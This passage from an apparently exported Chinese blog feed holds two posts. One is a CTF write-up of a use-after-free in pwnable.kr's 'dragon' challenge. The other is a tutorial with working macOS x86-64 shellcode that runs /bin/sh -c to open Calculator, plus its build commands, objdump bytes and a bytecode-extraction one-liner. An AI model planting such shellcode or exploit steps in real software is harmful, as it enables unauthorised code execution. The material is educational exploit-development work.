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" alt="img"></p>
<p>自闭+1</p>
]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>dragon</title>
    <url>/2015/11/05/dragon/</url>
    <content><![CDATA[<h4 id="0x00-dragon-是一个UAF漏洞的利用。"><a href="#0x00-dragon-是一个UAF漏洞的利用。" class="headerlink" title="0x00:dragon 是一个UAF漏洞的利用。"></a>0x00:dragon 是一个UAF漏洞的利用。</h4><ul>
<li>   UseAfterFree 是堆的漏洞利用的一种简单介绍</li>
<li>   简单的来说就是 再次使用了 free 掉的内存<a id="more"></a>
<h4 id="0x01-简单的看一下"><a href="#0x01-简单的看一下" class="headerlink" title="0x01:简单的看一下"></a>0x01:简单的看一下</h4>运行起来看一下<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/info.png" alt="info"></li>
</ul>
<p>是一个RPG游戏，有两种角色，每个角色的技能不一样(战士法师之类的吧…)<br>在进IDA分析的时候，发现龙是分两种的 baby_dragon 和 mommy_dragon，两种的血量和攻击力也各不相同。</p>
<p>而且龙的结构体是通过动态分配，填充数据，在龙死亡之后这部分内存free掉，再次游戏就会再分配内存…如此循环<br>此外，发现一个神秘关卡:<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/secret_level.png" alt="sl"><br>看着很美好，但是没什么x用，读取字符串限定长度，所以从这里拿不到shell的~</p>
<h4 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02:分析"></a>0x02:分析</h4><p>还是要从内存分配上下手，只有先打赢dragon才可以free内存，再次分配，才会有机会玩。</p>
<p>回去看看龙的结构体:<br>在dragon结构体中，表示血量的数据存储在 eax+8 的地方，还是 1 byte 的大小，范围应该是 0~127<br>龙种类有两种,我们需要出现mama dragon（血多，打的少）<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/0x02_1.png"><br><code>龙的血量在小于零的时候就会死亡！这点很关键。</code><br>RPG游戏的角色有两个，knight和priest。每个角色技能不一样。<br>priest 的 3 可以 使用mp 使得 dragon攻击无效，这时候dragon血量会恢复。那就可以使用priest，耗到dragon血量 溢出，一旦小于零(溢出)，那么dragon就死了，也就是让它加血加到溢出。</p>
<h4 id="0x03-控制流程"><a href="#0x03-控制流程" class="headerlink" title="0x03:控制流程"></a>0x03:控制流程</h4><p>IDA里查看流程，在胜利之后，free() 之后又重新malloc分配了龙的结构体，这时候 在输入名字的时候，我们可以控制4字节。(call eax)<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/0x03_1.png"></p>
<h4 id="0x04-怎么操作"><a href="#0x04-怎么操作" class="headerlink" title="0x04:怎么操作"></a>0x04:怎么操作</h4><p>大概流程如下：</p>
<ol>
<li><p>   故意死亡一次</p>
</li>
<li><p>   选择priest角色 332 的操作3轮</p>
</li>
<li><p>最后程序会有输入，这时候写入4字节到eax，之后程序会call eax</p>
<p> 验证漏洞<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/0x04_1.png"><br> 写出exp打远程服务器<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/exp.png"><br>打一发之后<br><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/drgon/get_shell.png"><br>搞定~~</p>
<h4 id="0x05：结束语"><a href="#0x05：结束语" class="headerlink" title="0x05：结束语"></a>0x05：结束语</h4><p> UAF 挺有意思~ 顺便把pwnable.kr的UAF那个关卡也给秒了~挺简单的 就不写了。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wargame</tag>
      </tags>
  </entry>
  <entry>
    <title>SHELLCODE on macOS</title>
    <url>/2020/11/28/shell-code-on-macos/</url>
    <content><![CDATA[<h2 id="shellcode-on-macOS"><a href="#shellcode-on-macOS" class="headerlink" title="shellcode on macOS"></a>shellcode on macOS</h2><p>最近因为一些工作上的需求需要搞下macOS上的shellcdoe，谷歌了很多资料/代码后发现还是有不少坑的，或者就是代码比较老，定制化程度比较高，不太符合我的需求，其实我需求也简单 pop calc或者reverse shell，就是个演示效果 🤣。</p>
<a id="more"></a>



<h2 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h2><p>我这里环境是 macOS big sur(对，没错，小白鼠🐁)</p>
<p>工具链基本都是brew直接装或者自带的。</p>
<h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>其实在macOS上写shellcode和Linux差不多，都是要走系统调用，大概就是布置参数，写好调用号，然后一个syscall进去即可。</p>
<p>我这里为了省事儿，做的是执行<code>system(&#39;xxxxxx&#39;)</code>的shellcode，这样对于我演示来说，不管是弹计算器还是反弹shell都比较简单，如果是实战啥的，建议参考很早之前hacking team泄漏那种玩法，不过核心原理都是那样，不过人家玩的比较高级(毕竟军火嘛)。</p>
<p>exec_calc.asm: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BITS 64</span><br><span class="line"></span><br><span class="line">global start</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    xor     rax, rax</span><br><span class="line">    mov     rax,0x2</span><br><span class="line">    ror     rax, 0x28</span><br><span class="line">    or      rax, 59</span><br><span class="line">    mov rcx, rax</span><br><span class="line"></span><br><span class="line">    xor     rdx, rdx</span><br><span class="line">    mov     rbx, 0x68732f2f6e69622f</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rdi</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    mov     rbx, 0x632d</span><br><span class="line">    push    rdx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rbx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    </span><br><span class="line">    ; 参数开始</span><br><span class="line">    mov rcx, 0x7070612e726f7461</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6c75636c61432f73</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x6e6f69746163696c</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x7070412f6d657473</span><br><span class="line">    push rcx</span><br><span class="line">    mov rcx, 0x79532f206e65706f</span><br><span class="line">    push rcx</span><br><span class="line">    ; 参数结束</span><br><span class="line">    </span><br><span class="line">    push rsp</span><br><span class="line">    pop rcx</span><br><span class="line"></span><br><span class="line">    push    rdx</span><br><span class="line">    push    rcx</span><br><span class="line">    push    rbx</span><br><span class="line">    push    rdi</span><br><span class="line">    push    rsp</span><br><span class="line">    pop     rsi</span><br><span class="line"></span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>



<h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>其实核心的就是执行的命令，即字符串怎么构造进去，这里是都压到栈里然后传递个指针，常规操作。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nasm -f macho64 -o exec_calc.o exec_calc.asm</span><br><span class="line">$ ld -macosx_version_min 10.7.0 -o exec_calc exec_calc.o</span><br><span class="line">ld: warning: building <span class="keyword">for</span> macOS 10.7.0 is deprecated</span><br></pre></td></tr></table></figure>

<p>然后从objdump的结果中提取字节码即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -d ./exec_calc.o</span><br><span class="line"></span><br><span class="line">./exec_calc.o:	file format Mach-O 64-bit x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section __TEXT,__text:</span><br><span class="line"></span><br><span class="line">0000000000000000 start:</span><br><span class="line">       0: 48 31 c0                     	xorq	%rax, %rax</span><br><span class="line">       3: b8 02 00 00 00               	movl	<span class="variable">$2</span>, %eax</span><br><span class="line">       8: 48 c1 c8 28                  	rorq	<span class="variable">$40</span>, %rax</span><br><span class="line">       c: 48 83 c8 3b                  	orq	<span class="variable">$59</span>, %rax</span><br><span class="line">      10: 48 89 c1                     	movq	%rax, %rcx</span><br><span class="line">      13: 48 31 d2                     	xorq	%rdx, %rdx</span><br><span class="line">      16: 48 bb 2f 62 69 6e 2f 2f 73 68	movabsq	<span class="variable">$7526411283028599343</span>, %rbx</span><br><span class="line">      20: 52                           	pushq	%rdx</span><br><span class="line">      21: 53                           	pushq	%rbx</span><br><span class="line">      22: 54                           	pushq	%rsp</span><br><span class="line">      23: 5f                           	popq	%rdi</span><br><span class="line">      24: 52                           	pushq	%rdx</span><br><span class="line">      25: bb 2d 63 00 00               	movl	<span class="variable">$25389</span>, %ebx</span><br><span class="line">      2a: 52                           	pushq	%rdx</span><br><span class="line">      2b: 53                           	pushq	%rbx</span><br><span class="line">      2c: 54                           	pushq	%rsp</span><br><span class="line">      2d: 5b                           	popq	%rbx</span><br><span class="line">      2e: 52                           	pushq	%rdx</span><br><span class="line">      2f: 48 b9 61 74 6f 72 2e 61 70 70	movabsq	<span class="variable">$8102082581755819105</span>, %rcx</span><br><span class="line">      39: 51                           	pushq	%rcx</span><br><span class="line">      3a: 48 b9 73 2f 43 61 6c 63 75 6c	movabsq	<span class="variable">$7815262045510774643</span>, %rcx</span><br><span class="line">      44: 51                           	pushq	%rcx</span><br><span class="line">      45: 48 b9 6c 69 63 61 74 69 6f 6e	movabsq	<span class="variable">$7957695015157983596</span>, %rcx</span><br><span class="line">      4f: 51                           	pushq	%rcx</span><br><span class="line">      50: 48 b9 73 74 65 6d 2f 41 70 70	movabsq	<span class="variable">$8102047401594156147</span>, %rcx</span><br><span class="line">      5a: 51                           	pushq	%rcx</span><br><span class="line">      5b: 48 b9 6f 70 65 6e 20 2f 53 79	movabsq	<span class="variable">$8742383117993865327</span>, %rcx</span><br><span class="line">      65: 51                           	pushq	%rcx</span><br><span class="line">      66: 54                           	pushq	%rsp</span><br><span class="line">      67: 59                           	popq	%rcx</span><br><span class="line">      68: 52                           	pushq	%rdx</span><br><span class="line">      69: 51                           	pushq	%rcx</span><br><span class="line">      6a: 53                           	pushq	%rbx</span><br><span class="line">      6b: 57                           	pushq	%rdi</span><br><span class="line">      6c: 54                           	pushq	%rsp</span><br><span class="line">      6d: 5e                           	popq	%rsi</span><br><span class="line">      6e: 0f 05                        	syscall</span><br></pre></td></tr></table></figure>

<p>这一步见仁见智了，有大佬用bash一行搞定，而我比较菜，之前是写了个py脚本提取然后格式化输出的。</p>
<p>之前看到过一个Linux版本的一键提取，不过感觉太复杂了…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d ./execve-stack|grep <span class="string">'[0-9a-f]:'</span>|grep -v <span class="string">'file'</span>|cut -f2 -d:|cut -f1-6 -d<span class="string">' '</span>|tr -s <span class="string">' '</span>|tr <span class="string">'\t'</span> <span class="string">' '</span>|sed <span class="string">'s/ $//g'</span>|sed <span class="string">'s/ /\\x/g'</span>|paste -d <span class="string">''</span> -s |sed <span class="string">'s/^/"/'</span>|sed <span class="string">'s/$/"/g'</span></span><br></pre></td></tr></table></figure>
<p>有兴趣的朋友可以搞个macOS版本🤣</p>
